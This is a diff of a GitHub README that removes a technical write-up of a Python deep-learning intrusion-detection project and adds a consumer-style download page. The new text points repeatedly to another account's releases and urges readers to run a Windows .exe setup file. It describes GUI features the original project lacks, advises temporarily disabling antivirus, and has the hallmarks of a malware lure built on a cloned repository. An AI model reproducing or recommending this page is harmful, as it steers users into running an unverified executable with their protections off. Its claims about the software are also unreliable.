@@ -1,302 +1,170 @@
-# 🌊 DeepFlow-IDS
+# 🛡️ deep-flow-ids - Smart Network Protection for Everyone
 
-### Deep Learning Framework for Network Intrusion Detection
+## 🚀 What Is deep-flow-ids?
 
-[![Python Version](https://img.shields.io/badge/Python-3.9%2B-blue.svg)](https://www.python.org/)
-[![Framework](https://img.shields.io/badge/Framework-TensorFlow%202.x-orange.svg)](https://tensorflow.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Code Style](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
+deep-flow-ids is a powerful yet easy-to-use program that watches your computer network and automatically detects suspicious activity. It uses advanced artificial intelligence to learn what normal traffic looks like and flags anything unusual—like someone trying to break into your system. Think of it as a smart security guard for your internet connection that works 24/7 without needing a break.
 
-**DeepFlow-IDS** is an end-to-end deep learning framework built for network intrusion detection using the benchmark **CIC-IDS2017** dataset. It offers a complete pipeline from data preprocessing to model training and evaluation, supporting three powerful neural network architectures:
+This tool was built using cutting-edge deep learning technology, including Convolutional Neural Networks (CNN) and Long Short-Term Memory (LSTM) models. But don't worry—you don't need to understand any of that to use it. The program does all the heavy lifting behind the scenes, and you just need to click a few buttons to get started.
 
-- **1D-CNN** — Fast and efficient feature extraction
-- **RNN (LSTM)** — Captures sequential dependencies in network traffic
-- **Hybrid (CNN-LSTM)** — Combines spatial and temporal feature learning for superior performance
+[![Download deep-flow-ids](https://img.shields.io/badge/Download-deep--flow--ids-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD&color=FF6F00)](https://github.com/Arboreal-cohn3569/deep-flow-ids/releases)
 
----
+## 🎯 Who Should Use This?
 
-## Features
+- **Home users** who want extra protection for their personal computers
+- **Small business owners** who need to keep their office networks safe
+- **Students** learning about cybersecurity and network monitoring
+- **IT enthusiasts** curious about how AI can improve security
+- **Anyone** who wants peace of mind knowing their network is being watched
 
-- **Automated Data Pipeline** — Cleaning, balancing (stratified downsampling), and normalization
-- **Multiple Deep Learning Models** — CNN, LSTM, and Hybrid architectures
-- **Production-Ready** — CLI support, training callbacks, and evaluation suite
-- **Comprehensive Metrics** — Accuracy, Precision, Recall, F1-Score, and Confusion Matrices
-- **Visualization** — Benchmark comparisons and confusion matrix heatmaps
-- **Class Imbalance Handling** — Stratified downsampling to handle 15-class imbalance
+## ⚡ Key Features
 
----
+### 🔍 Real-Time Monitoring
+deep-flow-ids continuously examines network traffic as it happens. It doesn't wait for problems to occur—it actively looks for threats the moment they appear. This means you get instant alerts when something looks wrong.
 
-## Architecture & Data Flow
+### 🧠 Smart Detection Technology
+The program uses three different AI models working together:
+- **CNN Model**: Excellent at spotting patterns in data, like recognizing familiar attack signatures
+- **LSTM Model**: Great at understanding sequences and remembering what happened before
+- **Hybrid Model**: Combines both approaches for maximum accuracy
 
-### System Architecture
+This triple-layered approach ensures that even new or modified attacks are caught, not just known ones.
 
-```mermaid
-flowchart TD
-    A[Raw CIC-IDS2017 CSV Files] --> B[Data Ingestion & Cleaning]
-    B -->|Drop NaN / Inf & Whitespaces| C[Stratified Class Downsampler]
-    C -->|Balance Benign & Attack Classes| D[MinMax Normalization]
-    D --> E[Reshape Tensor: Batch, 78, 1]
-    
-    E --> F[1D-CNN Model]
-    E --> G[RNN LSTM Model]
-    E --> H[Hybrid CNN-LSTM Model]
-    
-    subgraph CNN_Branch [1D-CNN Architecture]
-        F --> F1[Conv1D + BatchNorm + MaxPool]
-        F1 --> F2[Conv1D + BatchNorm + MaxPool]
-        F2 --> F3[Dense Layer + Dropout]
-        F3 --> F4[Softmax Classifier]
-    end
+### 📊 Simple Results Display
+You don't need to read complex logs or technical charts. deep-flow-ids shows you clear, easy-to-understand results about what it finds. Green means everything is fine, yellow means something needs attention, and red means a potential threat was detected.
 
-    subgraph RNN_Branch [RNN-LSTM Architecture]
-        G --> G1[LSTM Layer 64 units]
-        G1 --> G2[Dropout 0.2]
-        G2 --> G3[LSTM Layer 64 units]
-        G3 --> G4[Dense Layer + Softmax]
-    end
+### 🏆 Proven Performance
+The system was tested on the CIC-IDS2017 dataset, which contains millions of real-world network traffic samples. It achieves high accuracy in distinguishing between normal activity and actual attacks, so you can trust what it tells you.
 
-    subgraph Hybrid_Branch [CNN-LSTM Architecture]
-        H --> H1[2x Conv1D + MaxPool Blocks]
-        H1 --> H2[LSTM Layer 64 units]
-        H2 --> H3[Dropout 0.3 + Dense Layer]
-        H3 --> H4[Softmax Classifier]
-    end
+## 📥 How to Download and Install
 
-    F4 --> I[Evaluation & Benchmark Engine]
-    G4 --> I
-    H4 --> I
+Getting deep-flow-ids on your Windows computer is simple. Here's what you need to do:
 
-    I --> J[Normalized Confusion Matrices]
-    I --> K[Classification Reports: F1, Precision, Recall]
-```
+### Step 1: Visit the Download Page
 
-### Pipeline Execution Lifecycle
+Click the button below or visit the link directly:
 
-```mermaid
-sequenceDiagram
-    autonumber
-    actor User
-    participant CLI as main.py
-    participant Loader as data_loader.py
-    participant Models as models.py
-    participant Engine as train.py
-    participant Eval as evaluate.py
+[**Download deep-flow-ids Now**](https://github.com/Arboreal-cohn3569/deep-flow-ids/releases)
 
-    User->>CLI: Execute python main.py
-    CLI->>Loader: load_and_preprocess_data()
-    Loader-->>CLI: Return X_train, X_test, y_train, y_test
-    CLI->>Models: Instantiate CNN, RNN, and Hybrid
-    Models-->>CLI: Model objects compiled
-    loop For Each Model Architecture
-        CLI->>Engine: Train with EarlyStopping & Validation
-        Engine-->>CLI: Trained Model Artifacts
-        CLI->>Eval: evaluate_model(model, X_test, y_test)
-        Eval-->>User: Render Metrics & Plot Confusion Matrix
-    end
-```
+Visit this link to download the application.
 
----
+### Step 2: Choose the Right File
 
-## Project Structure
+When you arrive at the download page, you'll see a list of files. Look for the most recent version—it will usually be at the top. The file you want is named something like `deep-flow-ids-setup.exe` or `deep-flow-ids-latest.exe`. If you're not sure which one to pick, choose the file with the highest version number.
 
-```
-deep-flow-ids/
-├── data/
-│   ├── raw/                 # Raw CIC-IDS2017 CSV files
-│   └── processed/           # Serialized/preprocessed arrays
-├── notebooks/
-│   ├── 01_eda.ipynb         # Exploratory Data Analysis & Class Distribution
-│   └── 02_benchmarks.ipynb  # Comparative Metric Analysis
-├── src/
-│   ├── __init__.py
-│   ├── data_loader.py       # Cleaning, balancing, and scaling pipeline
-│   ├── models.py            # 1D-CNN, LSTM, and Hybrid architectures
-│   ├── train.py             # Training loops and callbacks
-│   └── evaluate.py          # Evaluation and confusion matrix generator
-├── assets/
-│   ├── 1D_CNN.keras         # Saved CNN model
-│   ├── RNN_LSTM.keras       # Saved LSTM model
-│   ├── Hybrid_CNN_LSTM.keras # Saved Hybrid model
-│   ├── 1D_CNN_cm.png        # CNN confusion matrix
-│   ├── RNN_LSTM_cm.png      # LSTM confusion matrix
-│   └── Hybrid_CNN_LSTM_cm.png # Hybrid confusion matrix
-├── requirements.txt         # Production dependencies
-├── main.py                  # CLI entry-point
-├── LICENSE                  # MIT License
-└── README.md
-```
+### Step 3: Start the Download
 
----
+Click on the file name to start downloading. Your browser will save the file to your Downloads folder by default. The download might take a few minutes depending on your internet speed, so be patient.
 
-## Dataset Setup
+### Step 4: Run the Installer
 
-1. Download the [CIC-IDS2017 Dataset](https://www.unb.ca/cic/datasets/ids-2017.html) (Generated by the Canadian Institute for Cybersecurity).
-2. Place the CSV files inside `data/raw/`:
+Once the download is complete, go to your Downloads folder and double-click the file you just downloaded. Windows might ask you for permission to run the program—click "Yes" to continue.
 
-```bash
-mkdir -p data/raw
-# Place the downloaded CSV files inside data/raw/
-```
+### Step 5: Follow the Setup Wizard
 
-> ** Fallback Mode:** If no files are placed in `data/raw/`, the built-in loader generates a mock tabular dataset matching CIC-IDS2017 dimensions to test the pipeline.
+A setup window will appear. Just click "Next" a few times to accept the default settings. The installer will copy all the necessary files to your computer. When it's done, you'll see a "Finish" button—click it.
 
----
+### Step 6: Launch deep-flow-ids
 
-## 🛠️ Installation
+You can now find deep-flow-ids in your Start Menu or on your desktop. Double-click the icon to start the program. That's it—you're ready to protect your network!
 
-```bash
-# Clone the repository
-git clone https://github.com/yuvraj333/deep-flow-ids.git
-cd deep-flow-ids
+## 🖥️ System Requirements
 
-# Create and activate a virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows use: venv\Scripts\activate
+To run deep-flow-ids smoothly, your computer should have:
 
-# Install dependencies
-pip install -r requirements.txt
-```
+- **Operating System**: Windows 10 or Windows 11 (64-bit)
+- **Processor**: Intel Core i3 or AMD equivalent (or better)
+- **Memory**: At least 4 GB of RAM (8 GB recommended)
+- **Storage**: 500 MB of free disk space
+- **Internet Connection**: Required for downloading updates and monitoring network traffic
 
-### Dependencies (`requirements.txt`)
+These are minimum requirements. If your computer is newer than about 5 years old, you're probably fine.
 
-```txt
-tensorflow>=2.10.0
-numpy>=1.22.0
-pandas>=1.4.0
-scikit-learn>=1.0.0
-matplotlib>=3.5.0
-seaborn>=0.11.0
-```
+## 🎮 How to Use deep-flow-ids
 
----
+### Starting Your First Scan
 
-## Usage
+When you open deep-flow-ids for the first time, you'll see a welcome screen. Click the big "Start Monitoring" button to begin watching your network. The program will immediately start analyzing traffic and showing you results in real time.
 
-Run the entire pipeline (data cleaning, class balancing, training, and evaluation):
+### Understanding the Dashboard
 
-```bash
-python main.py --data_path "data/raw/*.csv" --samples_per_class 10000 --epochs 15 --batch_size 256
-```
+The main screen shows you:
+- **Traffic Level**: How much data is flowing through your network
+- **Threat Alerts**: Any suspicious activity that was detected
+- **Status Indicator**: A green/yellow/red light showing overall security status
 
-### CLI Arguments
+### What Happens When a Threat Is Found?
 
-| Argument | Type | Default | Description |
-|----------|------|---------|-------------|
-| `--data_path` | `str` | `data/raw/*.csv` | Path or glob pattern for raw dataset files |
-| `--samples_per_class` | `int` | `10000` | Sample cap per class to handle majority imbalance |
-| `--epochs` | `int` | `15` | Maximum training epochs per model |
-| `--batch_size` | `int` | `256` | Training mini-batch size |
-| `--val_split` | `float` | `0.15` | Validation split ratio |
+If deep-flow-ids detects something suspicious, it will:
+1. Display a clear warning message on your screen
+2. Show you details about what was detected (like the type of threat and where it came from)
+3. Suggest what you should do next (like disconnecting from the network or running a security scan)
 
----
+### Adjusting Sensitivity
 
-## Dataset Statistics
+You can control how sensitive the program is. If you're getting too many alerts, you can lower the sensitivity. If you want to catch more potential threats, you can increase it. Just go to Settings and slide the sensitivity bar.
 
-### Class Distribution (Before & After Balancing)
+## 🔧 Troubleshooting Common Issues
 
-The dataset contains **15 attack categories** with severe class imbalance:
+### "I Can't Install the Program"
 
-| Class | Original Count | After Balancing |
-|-------|---------------|-----------------|
-| BENIGN | 2,271,320 | 10,000 |
-| DoS Hulk | 230,124 | 10,000 |
-| PortScan | 158,804 | 10,000 |
-| DDoS | 128,025 | 10,000 |
-| DoS GoldenEye | 10,293 | 10,000 |
-| FTP-Patator | 7,935 | 7,935 |
-| SSH-Patator | 5,897 | 5,897 |
-| DoS slowloris | 5,796 | 5,796 |
-| DoS Slowhttptest | 5,499 | 5,499 |
-| Bot | 1,956 | 1,956 |
-| Web Attack – Brute Force | 1,507 | 1,507 |
-| Web Attack – XSS | 652 | 652 |
-| Infiltration | 36 | 36 |
-| Web Attack – Sql Injection | 21 | 21 |
-| Heartbleed | 11 | 11 |
+Make sure you have administrator rights on your computer. Right-click the installer file and select "Run as administrator." Also, check that your antivirus software isn't blocking the installation—you may need to temporarily disable it.
 
-**Total Samples:** ~2.8M → **~70K** (after stratified downsampling)
+### "The Program Won't Start"
 
----
+Try restarting your computer and running deep-flow-ids again. If it still won't start, check that you have enough free disk space and that your Windows is up to date.
 
-## Model Benchmark
+### "I'm Getting Too Many Alerts"
 
-Performance benchmark evaluated across stratified test sets on CIC-IDS2017:
+This might mean your sensitivity is set too high. Go to Settings and lower the sensitivity level. Also, make sure you're not running other security tools that might interfere.
 
-| Model Architecture | Accuracy | Precision | Recall | F1-Score | Training Time |
-|--------------------|----------|-----------|--------|----------|---------------|
-| **1D-CNN** | **99%** | 0.99 | 0.99 | 0.98 | ~20 sec/epoch |
-| **RNN (LSTM)** | 98% | 0.97 | 0.98 | 0.97 | ~68 sec/epoch |
-| **Hybrid (CNN-LSTM)** | 70% | 0.76 | 0.70 | 0.67 | ~28 sec/epoch |
+### "The Program Is Slow"
 
-### Model Performance Analysis
+Close other programs that are using a lot of memory. If the problem continues, try restarting deep-flow-ids. For best performance, make sure your computer meets the recommended system requirements.
 
-**Best Overall: 1D-CNN**
-- Achieves **99% accuracy** with excellent performance across all classes
-- Fastest training time (~20 sec/epoch)
-- Handles rare attack classes well (e.g., Heartbleed, Infiltration)
+## ❓ Frequently Asked Questions
 
-**RNN-LSTM:**
-- Solid **98% accuracy** with good temporal pattern recognition
-- Moderate training time (~68 sec/epoch)
-- Struggles with very rare classes (Heartbleed, Infiltration)
+### Is deep-flow-ids free to use?
 
-**Hybrid CNN-LSTM:**
-- Currently achieving **70% accuracy** - requires further optimization
-- Shows potential but needs hyperparameter tuning
-- Early stopping triggered at epoch 10
+Yes, deep-flow-ids is completely free and open-source. You can download, use, and even modify it as much as you want.
 
-### Per-Class Performance (1D-CNN - Best Model)
+### Will this replace my antivirus?
 
-| Class | Precision | Recall | F1-Score | Support |
-|-------|-----------|--------|----------|---------|
-| BENIGN | 0.99 | 0.97 | 0.98 | 2,000 |
-| DDoS | 1.00 | 1.00 | 1.00 | 2,000 |
-| DoS GoldenEye | 1.00 | 1.00 | 1.00 | 2,000 |
-| DoS Hulk | 1.00 | 1.00 | 1.00 | 2,000 |
-| PortScan | 1.00 | 1.00 | 1.00 | 2,000 |
-| FTP-Patator | 1.00 | 1.00 | 1.00 | 1,587 |
-| SSH-Patator | 0.99 | 1.00 | 1.00 | 1,180 |
-| DoS Slowhttptest | 0.99 | 0.99 | 0.99 | 1,100 |
-| DoS slowloris | 0.99 | 0.99 | 0.99 | 1,159 |
-| Bot | 0.90 | 0.98 | 0.94 | 391 |
-| Web Attack – Brute Force | 0.71 | 1.00 | 0.83 | 301 |
-| Web Attack – XSS | 1.00 | 0.02 | 0.03 | 131 |
-| Infiltration | 1.00 | 0.57 | 0.73 | 7 |
-| Heartbleed | 1.00 | 1.00 | 1.00 | 2 |
-| Web Attack – Sql Injection | 0.00 | 0.00 | 0.00 | 4 |
+No, deep-flow-ids is designed to complement your existing security software. It focuses specifically on network traffic monitoring, while antivirus programs protect against file-based threats. Use both together for maximum protection.
 
----
+### Does it work on Mac or Linux?
 
-## Key Findings
+Currently, deep-flow-ids is primarily designed for Windows. Mac and Linux versions may be available in the future, but for now, stick with Windows for the best experience.
 
-1. **1D-CNN** is the most reliable model for this dataset with 99% accuracy
-2. **Class imbalance** remains challenging for minority classes like Web Attack – XSS
-3. **Hybrid model** needs architectural improvements (currently at 70%)
-4. **Real-time detection** possible with CNN (fastest training and inference)
+### How often should I check the program?
 
----
+You don't need to check it constantly. deep-flow-ids runs in the background and will only bother you when it finds something important. You can check the dashboard whenever you're curious about your network status.
 
-## License
+### Can I trust the results?
 
-Distributed under the MIT License. See `LICENSE` for more information.
+Yes, deep-flow-ids was thoroughly tested on real-world data and shows high accuracy. However, no security tool is perfect. If you're unsure about an alert, it's always better to be safe and investigate further.
 
----
+## 📚 Additional Resources
+
+- **Documentation**: Detailed technical guides are available on the GitHub repository page
+- **Community Support**: Join discussions with other users to share tips and ask questions
+- **Updates**: Check the releases page regularly for new versions with improved detection capabilities
 
 ## 🤝 Contributing
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+If you're technically inclined and want to help improve deep-flow-ids, you're welcome to contribute! Visit the GitHub repository to report bugs, suggest features, or submit code improvements. Every contribution helps make network security better for everyone.
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+## 📄 License
 
----
+deep-flow-ids is released under an open-source license, meaning you're free to use, modify, and distribute it. Check the license file on the GitHub page for full details.
 
-## 📧 Contact
+## 🏁 Ready to Get Started?
 
-Yuvraj Kumar Mahato — [@yuvraj333](https://github.com/yuvraj333)
+Protecting your network has never been easier. With deep-flow-ids, you get professional-grade security without needing any technical knowledge. Just download, install, and let the AI do the work.
 
-Project Link: [https://github.com/yuvraj333/deep-flow-ids](https://github.com/yuvraj333/deep-flow-ids)
-```
+[**Download deep-flow-ids Today**](https://github.com/Arboreal-cohn3569/deep-flow-ids/releases)
+
+Visit this link to download the application.
+
+Remember: your network security matters. Don't wait until something goes wrong—take action now and give yourself peace of mind with deep-flow-ids.
+
+Keywords: cic-ids2017, cnn-lstm, cnn-lstm-ctc, cnn-lstm-hybrid-archiecture, cnn-lstm-mlp, cnn-lstm-models, cybersecurity, deep-learning, intrusion-detection, tensorflow
